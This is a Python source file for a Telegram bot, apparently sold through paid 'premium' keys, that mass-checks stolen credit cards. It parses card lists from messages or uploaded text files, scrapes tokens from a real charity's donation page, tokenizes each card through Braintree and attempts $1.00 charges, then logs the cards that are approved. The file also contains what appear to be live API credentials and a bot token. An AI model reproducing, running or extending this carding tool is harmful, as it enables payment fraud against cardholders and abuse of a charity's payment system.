from telethon import TelegramClient, events
import json, os, re, asyncio, datetime, random
import aiohttp
import aiofiles

# ================== CONFIG ==================
API_ID = 37235723
API_HASH = "880a876edaf529c8493b873d47821ec2"
BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"

OWNER_ID = 7077294261

PREMIUM_FILE = "premium.json"
BANNED_FILE = "banned_users.json"
KEYS_FILE = "keys.json"
CC_FILE = "approved.txt"

# ================== B3 BRAINTREE CHECKER (Real) ==================
async def check_braintree(card: str):
    try:
        cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
        if len(yy) == 2:
            yy = "20" + yy

        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            # Step 1: Get Donation Page
            async with session.get("https://razomforukraine.humanitru.com/donate?page=razom-grants", headers={
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36'
            }) as r:
                html = await r.text()

            # Extract Tokens
            session_id = re.search(r'data-session="([^"]+)"', html)
            csrf = re.search(r'name="csrf-token" value="([^"]+)"', html)
            bt_token = re.search(r'data-braintree="([^"]+)"', html)

            if not (session_id and csrf and bt_token):
                return {"Response": "Token Extraction Failed", "Status": "Declined"}

            session_id = session_id.group(1)
            csrf = csrf.group(1)
            bt_token = bt_token.group(1)

            # Step 2: Tokenize Card (GraphQL)
            graphql = {
                "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": str(random.randint(100000,999999))},
                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { last4 } } }",
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": cc,
                            "expirationMonth": mm,
                            "expirationYear": yy,
                            "cvv": cvv
                        },
                        "options": {"validate": False}
                    }
                }
            }

            async with session.post("https://payments.braintree-api.com/graphql", json=graphql, headers={
                "authorization": f"Bearer {bt_token}",
                "braintree-version": "2018-05-10",
                "content-type": "application/json"
            }) as r2:
                data = await r2.json()

            if 'data' not in data or 'tokenizeCreditCard' not in data['data']:
                error = data.get('errors', [{}])[0].get('message', 'Card Declined')
                return {"Response": error, "Status": "Declined"}

            cc_token = data['data']['tokenizeCreditCard']['token']

            # Step 3: Final Charge
            payload = {
                'amount': '1.00',
                'client_id': '33',
                'session': session_id,
                'nonce': cc_token,
                'name': 'John Doe',
                'email': f'test{random.randint(10000,99999)}@gmail.com',
                'anonymous': 'true',
                'g-recaptcha-response': ''  # You can add 2captcha later
            }

            async with session.post("https://razomforukraine.humanitru.com/pay.json", data=payload, headers={
                'x-csrf-token': csrf,
                'x-requested-with': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0'
            }) as r3:
                final = await r3.json()

            if final.get('success') is True:
                return {"Response": "✅ CHARGED $1.00 (B3 LIVE)", "Status": "Approved"}
            else:
                msg = final.get('message', 'Declined by Gateway')
                return {"Response": msg, "Status": "Declined"}

    except Exception as e:
        return {"Response": f"Error: {str(e)[:80]}", "Status": "Declined"}


# ================== UTILITIES ==================
async def load_json(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as f:
                await f.write(json.dumps({}))
            return {}
        async with aiofiles.open(filename, "r") as f:
            return json.loads((await f.read()).strip() or "{}")
    except:
        return {}

async def save_json(filename, data):
    async with aiofiles.open(filename, "w") as f:
        await f.write(json.dumps(data, indent=4))

async def is_premium_user(user_id):
    data = await load_json(PREMIUM_FILE)
    uid = str(user_id)
    if uid not in data: return False
    try:
        return datetime.datetime.now() <= datetime.datetime.fromisoformat(data[uid]['expiry'])
    except:
        return False

async def is_banned_user(user_id):
    data = await load_json(BANNED_FILE)
    return str(user_id) in data

async def save_approved(card, response):
    async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
        await f.write(f"{card} | APPROVED | {response}\n")

# ================== KEY SYSTEM ==================
async def generate_key(days: int = 30):
    import secrets
    key = "B3-" + secrets.token_hex(8).upper()
    data = await load_json(KEYS_FILE)
    data[key] = {"days": days, "used": False}
    await save_json(KEYS_FILE, data)
    return key

async def redeem_key(user_id, key: str):
    data = await load_json(KEYS_FILE)
    premium = await load_json(PREMIUM_FILE)
    uid = str(user_id)
    key = key.strip().upper()
    if key not in data or data[key].get("used"):
        return False, "❌ Invalid or used key!"
    days = data[key]["days"]
    expiry = datetime.datetime.now() + datetime.timedelta(days=days)
    premium[uid] = {"expiry": expiry.isoformat(), "plan": f"{days} days"}
    data[key]["used"] = True
    await save_json(KEYS_FILE, data)
    await save_json(PREMIUM_FILE, premium)
    return True, f"✅ Premium activated for {days} days!"

# ================== TXT READER ==================
async def read_cards_from_txt(path):
    cards = []
    async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = await f.read()
        found = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', content)
        for c in found:
            cleaned = re.sub(r'[^0-9|]', '', c.replace(' ', ''))
            if len(cleaned.split('|')) == 4:
                cards.append(cleaned)
    return list(set(cards))

# ================== BOT ==================
client = TelegramClient('b3_bot', API_ID, API_HASH)

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
async def start(event):
    if await is_banned_user(event.sender_id):
        return await event.reply("🚫 Banned!")
    await event.reply("**🔥 B3 Braintree Checker**\n\n• Send .txt file\n• /mst cards\n• /key <key>")

@client.on(events.NewMessage())
async def doc_handler(event):
    if not event.document or not event.file.name.lower().endswith('.txt'): return
    if await is_banned_user(event.sender_id): return await event.reply("Banned!")
    if not await is_premium_user(event.sender_id) and event.sender_id != OWNER_ID:
        return await event.reply("❌ Premium required!")

    await event.reply("📂 Processing TXT...")
    path = f"temp_{event.sender_id}.txt"
    await event.download_media(path)
    cards = await read_cards_from_txt(path)
    os.remove(path)
    if not cards: return await event.reply("No cards found!")
    asyncio.create_task(process_mass(event, cards[:80]))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mst'))
async def mst(event):
    if await is_banned_user(event.sender_id): return await event.reply("Banned!")
    text = (await event.get_reply_message()).text if event.reply_to_msg_id else event.raw_text
    cards = re.findall(r'\d{15,16}\s*[\|:/-]\s*\d{1,2}\s*[\|:/-]\s*\d{2,4}\s*[\|:/-]\s*\d{3,4}', text)
    cards = [re.sub(r'[^0-9|]', '', c.replace(' ', '')) for c in cards]
    if not cards: return await event.reply("No valid cards!")
    asyncio.create_task(process_mass(event, cards[:80]))

@client.on(events.NewMessage(pattern=r'(?i)^[/.]genkey(?:\s+(\d+))?$'))
async def genkey(event):
    if event.sender_id != OWNER_ID: return await event.reply("Owner only!")
    days = int(event.pattern_match.group(1) or 30)
    key = await generate_key(days)
    await event.reply(f"✅ Key: `{key}` ({days} days)")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]key(?:\s+(.+))?$'))
async def redeem(event):
    if await is_banned_user(event.sender_id): return await event.reply("Banned!")
    key = event.pattern_match.group(1)
    if not key: return await event.reply("Usage: /key KEY")
    success, msg = await redeem_key(event.sender_id, key)
    await event.reply(msg)


async def process_mass(event, cards):
    total = len(cards)
    checked = approved = 0
    status_msg = await event.reply(f"🔥 Checking {total} cards...")

    for i in range(0, len(cards), 5):  # Small batch for stability
        batch = cards[i:i+5]
        tasks = [check_braintree(card) for card in batch]
        results = await asyncio.gather(*tasks)

        for card, res in zip(batch, results):
            checked += 1
            if res.get("Status") == "Approved":
                approved += 1
                await save_approved(card, res.get("Response", ""))
                await event.reply(f"💎 **B3 APPROVED**\n`{card}`\n{res.get('Response')}")

            try:
                await status_msg.edit(f"**B3 Progress**\n✅ Approved: **{approved}**\n🔄 {checked}/{total}")
            except:
                pass
            await asyncio.sleep(2.5)  # Be gentle with gateway

    await status_msg.edit(f"✅ Finished!\nApproved: **{approved}/{total}**")


async def main():
    print("🚀 B3 Braintree Bot Started | Real Checker Active")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
